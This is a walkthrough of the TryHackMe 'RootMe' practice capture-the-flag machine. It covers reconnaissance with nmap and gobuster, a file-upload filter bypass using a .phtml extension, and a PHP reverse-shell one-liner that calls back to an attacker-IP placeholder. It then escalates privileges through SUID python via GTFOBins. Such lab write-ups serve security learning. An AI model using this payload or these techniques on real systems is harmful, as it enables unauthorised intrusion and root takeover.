# RootMe - A Walkthrough of a TryHackMe Beginner CTF

## Step 1: Reconnaissance

As always, we start with an nmap scan to evaluate which ports are open on the target machine. Here I have used the -sS flag along with -sV. The -sS flag runs nmap in a more stealthy mode, dropping the connection before it is fully established while -sV provides greater detail on the services running on the open ports.

![Nmap Scan](/_assets/RootMe/nmap_scan_rootme.png)

The output from the scan shows us that we have we are dealing with a web server running HTTP on the standard port - port 80, as well as SSH on port 22. This means it is time to do some directory busting to try and find some hidden directories. My go-to tool for this is Gobuster, however, dirb is another popular choice.

To run Gobuster in dierctoy busting mode we use the following command:

```bash
gobuster dir -u <TARGET IP> -w <PATH TO WORDLIST>
```

This runs through a wordlist of common directory names and attempts to brute-force them, returning a list of directory names which returned a status code of 200 (or 301 if the directory contains a redirect).

Whilst this is running, I decided to check out the webpage in my browser. 

![RootMe Homepage](/_assets/RootMe/homepage_rootme.png)

There was nothing excited to be found here. I checked the source code too as sometimes web-developers can leave some clues in there but this also returned nothing of interest.

So I returned back to my gobuster scan which had now completed to have a look at the results. Amongst the typical directories there were two which stood out to me, /panel/ and /uploads/. 

![Gobuster results](/_assets/RootMe/gobuster_rootme.png)

After navigating to /panel/ I was presented with a file upload page. One would assume that any files uploaded here would be stored in the /uploads/ directory.

![/panel/ page](/_assets/RootMe/panel_rootme.png)

If I can upload files to the web server, lets see if it is vulnerable to Remote File Inclusion (RFI). This is a type of vulnerability which enables an attacker to upload a malicious file directly onto the web server thereby gaining shell access to the machine. Admins typically protect against this by sanitising the type of inputs allowed and restricting file types - only allowing permitted file types to be uploaded. Lets see how well this has been implemented.

## Step 2: Getting a Shell

I would recommend using Burpsuite at this point as it will give you a clearer idea of the type of files which will be accepted, however, I am having some issues configuring the proxy right now so I decided to do it the old fashioned way. Simple trial and error.

Firstly, I tried uploading a baisc php shell with the hopes that there were no restrictions at all but was greeted with an error message. I don't speak Portuguese, nor am I a gambling man, but I would put good money on it translating to PHP is not permitted.

![PHP not permitted](/_assets/RootMe/no-php_rootme.png)

On to Plan B. I have had luck in the past by changing the file name to shell.php.jpg so I decided to try that. This time the file uploaded but there was an error when trying to run the file. 

I then changed the file extension to shell.phtml after some research onto bypassing file upload restrictions and bingo! Third time lucky - the file uploaded and there were no errors. 

Here is an example of the php shell which I uploaded:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER IP>/4444 0>&1'");?>
```

After the upload was successful, I started a netcat listener on my attacking machine using:

```bash
nc -lvnp 4444
```

I then navigated to /uploads/shell.phtml and I had a reverse shell. From here, it was time to find the user flag which I did so using the following command:

```bash
find / -type f -name user.txt 2> /dev/null
```

## Step 3: Privilege Escalation

At this point it was time to escalate privileges and get root access. We can tell from the questions in the task that we will utilise SUID for this. Setuid means that the executable will be ran with the permissions of it's owner rather than the user executing it, with the owner typically being root. This is useful for tasks require a elevated permission, though it can also be abused by attackers if not configured properly as the attacker can sometimes retain root permissions after execution. 

To find which files have SUID permissions we run the following command:

```bash
find / -type f -perm -4000 
```

One particular file stands out from the resulting list. This is /usr/bin/python2.7. Whilst particular python scripts may need to be ran with root permissions, providing the whole python binary with SUID permissions is unsafe.

After navigating to [GTFObins](https://gtfobins.github.io/gtfobins/python/), the go-to for binary privilege escalation techniques, I found this:

![GTFObins results](/_assets/RootMe/gtfobins_rootme.png)

I made a couple of edits and inputted the command myself:

![Root access](/_assets/RootMe/root_rootme.png)

Now all I need to do is find the root flag which I did with the following command:

```bash
find / -type f -name root.txt 2> /dev/null
```
